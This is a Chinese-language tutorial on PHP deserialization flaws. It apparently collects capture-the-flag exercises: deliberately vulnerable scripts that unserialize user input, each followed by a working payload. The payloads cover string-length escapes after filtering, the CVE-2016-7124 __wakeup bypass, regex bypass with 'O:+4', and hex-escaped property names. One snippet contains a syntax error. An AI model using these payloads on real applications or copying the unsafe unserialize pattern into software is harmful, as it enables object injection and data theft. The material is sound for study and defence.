# PHP反序列化

**serialize** 将对象格式化成有序的字符串
**unserialize** 将字符串还原成原来的对象

## 魔术方法

```
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```

## 格式化类型

```
a - array 数组
b - boolean 布尔
d - double
i - integer
o - common object
r - reference
s - non-escaped binary string
S - escaped binary string
C - custom object
O - class
N - null
R - pointer reference
U - unicode string
```

### 特殊说明

在Class反序列化中，如果变量前是protected，则会在变量名前加上`\x00*\x00`,private则会在变量名前加上`\x00类名\x00`,输出时一般需要url编码。

案例：

```php
<?php
class test{
    public $a;
    protected  $b;
    private $c;
    function __construct(){$this->a = "xiongmao";$this->b="shizi";$this->c="laohu";}
    function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
echo("\n");
echo urlencode(serialize($a));
?>
```

结果：

```
O:4:"test":3:{s:1:"a";s:8:"xiongmao";s:4:"*b";s:5:"shizi";s:7:"testc";s:5:"laohu";}
O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A8%3A%22xiongmao%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A5%3A%22shizi%22%3Bs%3A7%3A%22%00test%00c%22%3Bs%3A5%3A%22laohu%22%3B%7D


分类说明
O:4:"test":3 ==> 名称长度为4的test类，含有3个属性
s:1:"a";s:8:"xiongmao"; ==> 长度为1的公共属性a的值为8长度的xiongmao
s:4:"\x00*\x00b";s:5:"shizi"; ==> 长度为1的保护属性b的值为5长度的shizi
s:7:"\x00test\x00c";s:5:"laohu"; ==> 长度为1的私有属性c的值为5长度的laohu
```

## 替换后序列化字符串变长

### 示例

```php
<?php
function filter($str){
    return str_replace('bb', 'ccc', $str);
}
class A{
    public $name='aaaa';
    public $pass='123456';
    function __construct($name){
        $this->name=$name;
    }
}

$name=$_GET['user'];
$param=serialize(new A($name));
$profile=unserialize(filter($param));

if ($profile->pass == "654321"){
    echo file_get_contents("/flag");
}

?>
```

### 题解

```
$name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"654321";}";
```

### 思路

**php序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。**

```
当传递以上字符串后
经反序列后数据变为，此时为正常反序列化name的值
s:4:"name";s:81:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"654321";}";
经过过滤函数使得name的值变长，但是序列化记录的值未发生改变
s:4:"name";s:81:"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";s:4:"pass";s:6:"654321";}";
导致发生了截断
```

## 替换后序列化字符串变短

### 示例

```php
<?php
function xian($name){
    $black=array("flag");
    $name=str_replace($black,"no",$name);
    return $name;
}

class chengdu{
    public $user;
    public $pass;
    public $vip = false ;
    function __construct($user,$pass){
        $this->user=$user;
    	$this->pass=$pass;
    }
}

$user=$_GET['user'];
$pass=$_GET['pass'];
$param=serialize(new chengdu($user,$pass));
$profile=unserialize(xian($param));

if ($profile->vip){
    echo file_get_contents("/flag");
}

?>
```

### 题解

```
$user=flagflagflagflagflagflagflagflagflagflag;
$pass=c";s:4:"pass";s:1:"c";s:3:"vip";b:1;};
```

### 思路

**php序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。**

```
当传递以上字符串后
经反序列后数据变为，此时为正常反序列化值
O:7:"chengdu":3:{s:4:"user";s:40:"flagflagflagflagflagflagflagflagflagflag";s:4:"pass";s:37:"c";s:4:"pass";s:1:"c";s:3:"vip";b:1;}";s:3:"vip";b:0;}
经过过滤函数使得user的值变短，但是序列化记录的值未发生改变
O:7:"chengdu":3:{s:4:"user";s:40:"nononononononononono";s:4:"pass";s:37:"c";s:4:"pass";s:1:"c";s:3:"vip";b:1;}";s:3:"vip";b:0;}
导致数据变短，可以加入新的属性数据
```

## CVE-2016-7124（绕过__wakeup）
### 前置需求
-    PHP5 < 5.6.25
-    PHP7 < 7.0.10

### 示例

```php
<?php
class test{
    public $a;
    public function __construct($a){
        $this->a = $a;
    }
    public function __wakeup(){
        $this->a = '666';
    }
    public function  __destruct(){
        echo $this->a;
    }
}

$a = $_GET['a'];
// $param = serialize(new test($a));
$profile = unserialize($a);

if ($profile->a != '666'){
    echo file_get_contents("/flag");
}

?>
```

### 题解

```
a=O:4:"test":2:{s:1:"a";s:6:"ssssss";}
```

### 思路

**序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。**

## 正则绕过

### 示例

```php
<?php
class test{
    public $a;
    public function __construct$a(){
        $this->a = $a;
    }
    public function  __destruct(){
        if ($this->a == 'abc'){
            echo file_get_contents("/flag");
        }
    }
}

function match($data){
    if (preg_match('/^O:\d+/',$data)){
        die('you lose!');
    }else{
        return $data;
    }
}
// $a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
// +号绕过
// $b = str_replace('O:4','O:+4', $a);
// unserialize(match($b));
// serialize(array($a));
// unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');

$a = $_GET['a'];
unserialize(match($a));

?>
```

### 题解

```
a=O:+4:"test":1:{s:1:"a";s:3:"abc";}
```

### 思路

利用加号绕过（注意在url里传参时+要编码为%2B）

## 16进制绕过

### 示例

```php
<?php
class test{
    public $username;
    public function __construct($username){
        $this->username = $username;
    }
    public function  __destruct(){
        if($this->username == "admin"){
            echo file_get_contents("/flag");
        }    
    }
}
function check($data){
    if(stristr($data, 'username')!==False){
        echo("你绕不过！！".PHP_EOL);
    }
    else{
        return $data;
    }
}
// 未作处理前
// $a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
// $a = check($a);
// unserialize($a);
// 做处理后 \75是u的16进制
// $a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
// $a = check($a);
// unserialize($a);

$username = $_GET['username'];
unserialize(check($username));

?>
```

### 题解

```
username=O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}
```

